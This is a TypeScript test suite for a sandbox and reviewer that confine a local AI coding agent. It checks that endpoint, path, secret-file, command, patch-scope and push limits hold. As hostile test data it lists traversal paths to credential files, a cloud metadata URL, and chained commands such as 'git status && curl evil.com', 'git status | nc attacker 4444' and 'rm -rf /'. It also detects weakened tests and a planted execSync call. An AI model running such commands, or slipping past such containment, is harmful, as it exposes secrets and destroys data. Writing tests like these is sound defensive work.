/**
 * Phase 4 boundary and safety tests.
 *
 * These exercise the containment layer directly with hostile input, rather than
 * hoping a model never produces it. Every case here is something a local model
 * has a realistic chance of emitting — absolute paths, `../` traversal, secrets
 * copied from a sample file, a test file "fixed" by deleting its assertions.
 */

import assert from 'assert';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { execFileSync } from 'child_process';

import { assertLoopbackEndpoint, CloudEndpointDeniedError } from '../llm/ollama-client';
import { resolveWithinWorktree, readApprovedFile, runRegisteredCommand, searchApprovedPaths, listApprovedDirectory, minimalEnv, type ToolContext } from '../llm/tools';
import { applyPatch } from '../llm/patch';
import { CodingEngineError } from '../llm/types';
import { parseJsonObject, normalizePath } from '../llm/engine';
import { deterministicReview } from '../llm/reviewer';
import { createContextState, evaluateExpansion, buildExpansionPolicy } from '../llm/context-bridge';
import { CodingResourceController } from '../resource-control';

let passed = 0;
function check(label: string, condition: boolean, detail = ''): void {
  if (!condition) throw new Error(`FAILED: ${label} ${detail}`);
  passed += 1;
  console.log(`[agentic-coding] ok  ${label}`);
}

function gitSync(cwd: string, args: string[]): string {
  return execFileSync('git', args, { cwd, encoding: 'utf8', windowsHide: true, stdio: ['ignore', 'pipe', 'pipe'] }).trim();
}

function makeWorktree(): string {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'mi-phase4-sec-'));
  const repo = path.join(root, 'repo');
  fs.mkdirSync(path.join(repo, 'src'), { recursive: true });
  fs.writeFileSync(path.join(repo, 'src', 'app.js'), "module.exports = { run: () => 'ok' };\n");
  fs.writeFileSync(path.join(repo, 'src', 'util.js'), "module.exports = { add: (a, b) => a + b };\n");
  fs.mkdirSync(path.join(repo, 'test'), { recursive: true });
  fs.writeFileSync(
    path.join(repo, 'test', 'app.test.js'),
    "const test=require('node:test');const assert=require('node:assert');\ntest('runs', () => { assert.equal(require('../src/app').run(), 'ok'); });\ntest('adds', () => { assert.equal(require('../src/util').add(2,2), 4); });\n"
  );
  fs.writeFileSync(path.join(repo, '.env'), 'API_KEY=fake-secret-value-that-should-never-be-read\n');
  gitSync(repo, ['init', '--initial-branch=main']);
  gitSync(repo, ['config', 'user.name', 'Phase4 Sec']);
  gitSync(repo, ['config', 'user.email', 'sec@example.invalid']);
  gitSync(repo, ['add', '--', '.']);
  gitSync(repo, ['commit', '-m', 'seed']);
  return repo;
}

function toolCtx(worktree: string, allowed: string[]): ToolContext {
  return {
    worktreePath: worktree,
    allowedPaths: new Set(allowed),
    registeredCommands: new Map([['git status', { command: 'git', args: ['status', '--porcelain'], cwd: worktree }]]),
  };
}

async function run(): Promise<void> {
  const worktree = makeWorktree();
  const ctx = toolCtx(worktree, ['src/app.js', 'src/util.js', 'test/app.test.js']);

  // ── 1. endpoint / cloud guard ─────────────────────────────────────────────
  check('loopback endpoint accepted', assertLoopbackEndpoint('http://127.0.0.1:11434') === 'http://127.0.0.1:11434');
  check('localhost endpoint accepted', assertLoopbackEndpoint('http://localhost:11434').includes('localhost'));
  for (const hostile of [
    'https://api.openai.com/v1',
    'https://api.anthropic.com',
    'http://10.0.0.5:11434',
    'http://169.254.169.254/latest/meta-data',
    'http://evil.example.com',
    'file:///etc/passwd',
  ]) {
    let denied = false;
    try {
      assertLoopbackEndpoint(hostile);
    } catch (err) {
      denied = err instanceof CloudEndpointDeniedError;
    }
    check(`cloud/non-loopback endpoint denied: ${hostile}`, denied);
  }

  // ── 2. path escape ────────────────────────────────────────────────────────
  for (const hostile of [
    '../../../etc/passwd',
    '..\\..\\..\\Windows\\System32\\config\\SAM',
    'C:\\Windows\\System32\\drivers\\etc\\hosts',
    '/etc/shadow',
    '\\\\server\\share\\secret.txt',
    'src/../../outside.js',
    'src/\0evil.js',
    'CON',
    'src/NUL.js',
  ]) {
    const resolved = resolveWithinWorktree(worktree, hostile);
    check(`path escape rejected: ${JSON.stringify(hostile)}`, !resolved.ok, resolved.reason ?? '');
  }
  check('legitimate relative path accepted', resolveWithinWorktree(worktree, 'src/app.js').ok);
  check('./-prefixed path accepted', resolveWithinWorktree(worktree, './src/util.js').ok);

  // ── 3. .env and secret material ───────────────────────────────────────────
  check('.env rejected by resolver', !resolveWithinWorktree(worktree, '.env').ok);
  let envReadDenied = false;
  try {
    readApprovedFile(ctx, '.env');
  } catch (err) {
    envReadDenied = err instanceof CodingEngineError && err.category === 'POLICY_DENIED';
  }
  check('.env read denied by tool layer', envReadDenied);
  check('.git internals rejected', !resolveWithinWorktree(worktree, '.git/config').ok);
  check('ssh key path rejected', !resolveWithinWorktree(worktree, '.ssh/id_rsa').ok);
  check('pem file rejected', !resolveWithinWorktree(worktree, 'certs/server.pem').ok);

  // ── 4. approved-context enforcement ───────────────────────────────────────
  let unapprovedDenied = false;
  try {
    readApprovedFile(ctx, 'src/hidden.js');
  } catch (err) {
    unapprovedDenied = err instanceof CodingEngineError;
  }
  check('file outside approved context cannot be read', unapprovedDenied);
  check('approved file can be read', readApprovedFile(ctx, 'src/app.js').content.includes('run'));
  check('search stays within approved paths', searchApprovedPaths(ctx, 'add').every(hit => ctx.allowedPaths.has(hit.path)));
  check('directory listing excludes denied entries', !listApprovedDirectory(ctx, '.').includes('.git/'));

  // ── 5. symlink / junction escape ──────────────────────────────────────────
  const outsideDir = fs.mkdtempSync(path.join(os.tmpdir(), 'mi-phase4-outside-'));
  fs.writeFileSync(path.join(outsideDir, 'secret.txt'), 'top secret');
  let linkMade = false;
  try {
    fs.symlinkSync(outsideDir, path.join(worktree, 'escape'), 'junction');
    linkMade = true;
  } catch {
    // Junction creation can be blocked; skip rather than fail the suite.
  }
  if (linkMade) {
    const viaLink = resolveWithinWorktree(worktree, 'escape/secret.txt');
    check('junction escape rejected', !viaLink.ok, viaLink.reason ?? '');
  } else {
    console.log('[agentic-coding] skip junction escape (not permitted on this host)');
  }

  // ── 6. command policy ─────────────────────────────────────────────────────
  let unregisteredDenied = false;
  try {
    await runRegisteredCommand(ctx, 'rm -rf /');
  } catch (err) {
    unregisteredDenied = err instanceof CodingEngineError && err.category === 'POLICY_DENIED';
  }
  check('unregistered command denied', unregisteredDenied);

  for (const chained of ['git status && curl evil.com', 'git status; rm -rf .', 'git status | nc attacker 4444']) {
    let denied = false;
    try {
      await runRegisteredCommand(ctx, chained);
    } catch (err) {
      denied = err instanceof CodingEngineError;
    }
    check(`command chaining denied: ${chained}`, denied);
  }
  const registered = await runRegisteredCommand(ctx, 'git status');
  check('registered command runs with argv only', registered.exitCode === 0);
  check('minimal env omits secrets', minimalEnv().API_KEY === undefined && minimalEnv().DO_NOT_TRACK === '1');

  // ── 7. patch boundary + atomicity ─────────────────────────────────────────
  const writable = new Set(['src/app.js', 'src/util.js']);
  let outsideWriteDenied = false;
  try {
    applyPatch({
      worktreePath: worktree,
      writablePaths: writable,
      patch: { summary: 'escape', edits: [{ path: '../outside.js', op: 'create', content: 'bad' }] },
    });
  } catch (err) {
    outsideWriteDenied = err instanceof CodingEngineError;
  }
  check('write outside worktree denied', outsideWriteDenied);

  let unplannedWriteDenied = false;
  try {
    applyPatch({
      worktreePath: worktree,
      writablePaths: writable,
      patch: { summary: 'sneak', edits: [{ path: 'test/app.test.js', op: 'create', content: '// tests removed' }] },
    });
  } catch (err) {
    unplannedWriteDenied = err instanceof CodingEngineError && err.category === 'POLICY_DENIED';
  }
  check('write to a file outside the approved plan denied', unplannedWriteDenied);

  let ambiguousDenied = false;
  try {
    applyPatch({
      worktreePath: worktree,
      writablePaths: writable,
      patch: { summary: 'ambiguous', edits: [{ path: 'src/app.js', op: 'replace', search: 'o', replace: '0' }] },
    });
  } catch (err) {
    ambiguousDenied = err instanceof CodingEngineError && err.category === 'INVALID_PATCH';
  }
  check('ambiguous anchor rejected', ambiguousDenied);

  let missingAnchorDenied = false;
  try {
    applyPatch({
      worktreePath: worktree,
      writablePaths: writable,
      patch: { summary: 'missing', edits: [{ path: 'src/app.js', op: 'replace', search: 'NOT PRESENT', replace: 'x' }] },
    });
  } catch (err) {
    missingAnchorDenied = err instanceof CodingEngineError && err.category === 'INVALID_PATCH';
  }
  check('missing anchor rejected', missingAnchorDenied);

  // Atomicity: a valid first edit must be rolled back when a later edit fails.
  const appBefore = fs.readFileSync(path.join(worktree, 'src', 'app.js'), 'utf8');
  let batchFailed = false;
  try {
    applyPatch({
      worktreePath: worktree,
      writablePaths: writable,
      patch: {
        summary: 'partial',
        edits: [
          { path: 'src/app.js', op: 'replace', search: "'ok'", replace: "'changed'" },
          { path: 'src/util.js', op: 'replace', search: 'NOT PRESENT', replace: 'x' },
        ],
      },
    });
  } catch {
    batchFailed = true;
  }
  check('failed batch throws', batchFailed);
  check('failed batch rolled back the earlier edit', fs.readFileSync(path.join(worktree, 'src', 'app.js'), 'utf8') === appBefore);

  const good = applyPatch({
    worktreePath: worktree,
    writablePaths: writable,
    patch: { summary: 'ok', edits: [{ path: 'src/util.js', op: 'replace', search: 'a + b', replace: 'a + b + 0' }] },
  });
  check('legitimate anchored edit applies', good.changedFiles.includes('src/util.js'));

  // Whitespace-tolerant anchoring. Local models reproduce the right lines with
  // reconstructed indentation; this must still apply, and must still refuse an
  // anchor that is genuinely absent or genuinely ambiguous.
  fs.writeFileSync(
    path.join(worktree, 'src', 'indent.js'),
    'function build(rows) {\n    const out = [];\n    for (const row of rows) {\n        out.push(row);\n    }\n    return out;\n}\n'
  );
  const indentWritable = new Set(['src/indent.js']);

  const reindented = applyPatch({
    worktreePath: worktree,
    writablePaths: indentWritable,
    patch: {
      summary: 'wrong indentation in anchor',
      edits: [
        {
          path: 'src/indent.js',
          op: 'replace',
          // Same lines, two-space indentation instead of the file's four.
          search: '  for (const row of rows) {\n    out.push(row);\n  }',
          replace: '  for (const row of rows) {\n    if (row) out.push(row);\n  }',
        },
      ],
    },
  });
  const reindentedText = fs.readFileSync(path.join(worktree, 'src', 'indent.js'), 'utf8');
  check('anchor with reconstructed indentation still applies', reindented.changedFiles.includes('src/indent.js'));
  check('the intended change is present', reindentedText.includes('if (row) out.push(row);'), reindentedText);
  // Re-indentation shifts the replacement by a uniform delta, which restores the
  // block's own base indent. It does not rewrite the model's indent *step*, so a
  // 2-space-step replacement stays 2-space-step inside a 4-space-step file. That
  // is cosmetic; the guarantee is that the block is nested under its opener and
  // the surrounding lines are untouched.
  check(
    'replacement block is indented under its opening line',
    /\n    for \(const row of rows\) \{\n(\s+)if \(row\)/.test(reindentedText) &&
      (reindentedText.match(/\n    for \(const row of rows\) \{\n(\s+)if/)?.[1].length ?? 0) > 4,
    reindentedText
  );
  check('surrounding lines are untouched', reindentedText.startsWith('function build(rows) {\n    const out = [];'));
  check('trailing lines are untouched', reindentedText.endsWith('    return out;\n}\n'), reindentedText);

  fs.writeFileSync(
    path.join(worktree, 'src', 'dup.js'),
    'function a() {\n  doWork();\n}\n\nfunction b() {\n  doWork();\n}\n'
  );
  let fuzzyAmbiguous = false;
  try {
    applyPatch({
      worktreePath: worktree,
      writablePaths: new Set(['src/dup.js']),
      patch: { summary: 'ambiguous', edits: [{ path: 'src/dup.js', op: 'replace', search: '    doWork();', replace: '    doWork(1);' }] },
    });
  } catch (err) {
    fuzzyAmbiguous = err instanceof CodingEngineError && err.category === 'INVALID_PATCH';
  }
  check('whitespace-insensitive match that is ambiguous is refused', fuzzyAmbiguous);

  let fuzzyAbsent = false;
  try {
    applyPatch({
      worktreePath: worktree,
      writablePaths: indentWritable,
      patch: { summary: 'absent', edits: [{ path: 'src/indent.js', op: 'replace', search: 'nothing like this exists', replace: 'x' }] },
    });
  } catch (err) {
    fuzzyAbsent = err instanceof CodingEngineError && /not found/.test(err.message);
  }
  check('genuinely absent anchor is still rejected', fuzzyAbsent);
  check('rejection message includes the attempted anchor', (() => {
    try {
      applyPatch({
        worktreePath: worktree,
        writablePaths: indentWritable,
        patch: { summary: 'absent', edits: [{ path: 'src/indent.js', op: 'replace', search: 'zzz-not-present', replace: 'x' }] },
      });
      return false;
    } catch (err) {
      return err instanceof Error && err.message.includes('zzz-not-present');
    }
  })());

  // ── 8. review catches secrets, weakened tests and out-of-scope edits ───────
  fs.writeFileSync(
    path.join(worktree, 'src', 'app.js'),
    "const API_KEY = 'fake-secret-value-for-review-test';\nmodule.exports = { run: () => 'ok' };\n"
  );
  const secretReview = await deterministicReview({ worktreePath: worktree, validation: [], allowedFiles: ['src/app.js', 'src/util.js'] });
  check('secret literal detected in diff', secretReview.findings.some(f => f.includes('secret')));

  fs.writeFileSync(path.join(worktree, 'test', 'app.test.js'), "const test=require('node:test');\ntest.skip('runs', () => {});\n");
  const testReview = await deterministicReview({ worktreePath: worktree, validation: [], allowedFiles: ['src/app.js', 'src/util.js', 'test/app.test.js'] });
  check('weakened test detected', testReview.findings.some(f => /test file materially shrank|test weakened/.test(f)));

  const scopeReview = await deterministicReview({ worktreePath: worktree, validation: [], allowedFiles: ['src/util.js'] });
  check('out-of-scope edit detected', scopeReview.findings.some(f => f.includes('outside the approved plan')));

  fs.writeFileSync(path.join(worktree, 'src', 'util.js'), "const cp = require('child_process');\nmodule.exports = { add: (a,b) => cp.execSync('whoami') };\n");
  const suspiciousReview = await deterministicReview({ worktreePath: worktree, validation: [], allowedFiles: ['src/app.js', 'src/util.js', 'test/app.test.js'] });
  check('suspicious runtime capability detected', suspiciousReview.findings.some(f => f.includes('suspicious')));

  gitSync(worktree, ['checkout', '--', '.']);

  // ── 9. context expansion policy ───────────────────────────────────────────
  const pack = {
    id: 'p1', projectId: 'proj', mapVersion: 'v1', sourceSha: null, mapStatus: 'FRESH' as const,
    policy: 'MAP_PLUS_TARGETED_READ' as const, summary: '', moduleSummaries: [],
    includedPaths: ['src/app.js', 'src/util.js'], excludedPaths: [], relevanceHints: [],
    resumeContextId: null, createdAt: new Date().toISOString(),
  };
  const policy = buildExpansionPolicy(worktree, pack);
  const state = createContextState(worktree);

  check(
    'expansion into another project denied',
    !evaluateExpansion(state, policy, { path: '../other-project/src/index.js', reason: 'I need to see the sibling project' }).granted
  );
  check(
    'expansion to .env denied',
    !evaluateExpansion(state, policy, { path: '.env', reason: 'I need the environment configuration values' }).granted
  );
  check(
    'expansion outside the context pack denied',
    !evaluateExpansion(state, policy, { path: 'test/app.test.js', reason: 'I want to inspect the test file' }).granted
  );
  check(
    'expansion without justification denied',
    !evaluateExpansion(state, policy, { path: 'src/util.js', reason: 'x' }).granted
  );
  const grantedExpansion = evaluateExpansion(state, policy, { path: 'src/util.js', reason: 'the helper under test lives here' });
  check('justified in-pack expansion granted and recorded', grantedExpansion.granted && grantedExpansion.bytes > 0);

  // ── 10. model output parsing is defensive ─────────────────────────────────
  check('fenced JSON recovered', parseJsonObject<{ a: number }>('```json\n{"a":1}\n```', 'test').a === 1);
  check('JSON with prose recovered', parseJsonObject<{ a: number }>('Here you go: {"a":2} hope that helps', 'test').a === 2);
  let badJson = false;
  try {
    parseJsonObject('not json at all', 'test');
  } catch (err) {
    badJson = err instanceof CodingEngineError && err.category === 'INVALID_PLAN';
  }
  check('unparseable model output classified INVALID_PLAN', badJson);
  check('backslash paths normalised', normalizePath('src\\nested\\file.ts') === 'src/nested/file.ts');

  // ── 11. resource limits ───────────────────────────────────────────────────
  const controller = new CodingResourceController({
    maxActiveCodingTasks: 1, maxConcurrentModels: 1, modelLoadTimeoutMs: 1000, inferenceTimeoutMs: 1000,
    maxContextBytes: 1024, maxOutputBytes: 1024, minFreeDiskGb: 0, minFreeRamGb: 0, maxWorktrees: 2,
  });
  const first = await controller.admit('task-1');
  check('first coding task admitted', first.admitted);
  const second = await controller.admit('task-2');
  check('second concurrent coding task refused', !second.admitted && String(second.reason).includes('RESOURCE_EXHAUSTED'));
  controller.release('task-1');
  check('slot reusable after release', (await controller.admit('task-2')).admitted);
  controller.release('task-2');

  const tooManyWorktrees = await controller.admit('task-3', { worktreeCount: 99 });
  check('worktree count limit enforced', !tooManyWorktrees.admitted);

  const diskStarved = new CodingResourceController({
    maxActiveCodingTasks: 4, maxConcurrentModels: 1, modelLoadTimeoutMs: 1000, inferenceTimeoutMs: 1000,
    maxContextBytes: 1024, maxOutputBytes: 1024, minFreeDiskGb: 1e9, minFreeRamGb: 0, maxWorktrees: 99,
  });
  check('disk floor enforced', !(await diskStarved.admit('task-4')).admitted);

  // Model calls are serialised even when many are requested at once.
  let concurrent = 0;
  let peak = 0;
  await Promise.all(
    Array.from({ length: 5 }, () =>
      controller.withModelSlot(async () => {
        concurrent += 1;
        peak = Math.max(peak, concurrent);
        await new Promise(resolve => setTimeout(resolve, 20));
        concurrent -= 1;
      })
    )
  );
  check('model inference is serialised to one slot', peak === 1, `peak=${peak}`);

  // ── 12. the engine cannot push ────────────────────────────────────────────
  const engineSource = fs.readFileSync(path.join(__dirname, '..', 'llm', 'engine.ts'), 'utf8');
  const toolSource = fs.readFileSync(path.join(__dirname, '..', 'llm', 'tools.ts'), 'utf8');
  check('engine contains no push/merge/deploy capability', !/['"](push|merge|deploy)['"]/.test(engineSource));
  check('tool layer never enables a shell', /shell: false/.test(toolSource) && !/shell: true/.test(toolSource));

  let pushDenied = false;
  try {
    await runRegisteredCommand(ctx, 'git push origin main');
  } catch (err) {
    pushDenied = err instanceof CodingEngineError && err.category === 'POLICY_DENIED';
  }
  check('git push is not a registered command', pushDenied);

  console.log(`\n[agentic-coding] PASS — ${passed} boundary assertions`);

  try {
    fs.rmSync(path.dirname(worktree), { recursive: true, force: true, maxRetries: 3, retryDelay: 100 });
    fs.rmSync(outsideDir, { recursive: true, force: true, maxRetries: 3, retryDelay: 100 });
  } catch {
    // temp cleanup is best-effort
  }
}

run().catch(err => {
  console.error(`[agentic-coding] FAIL: ${err instanceof Error ? err.message : String(err)}`);
  process.exit(1);
});
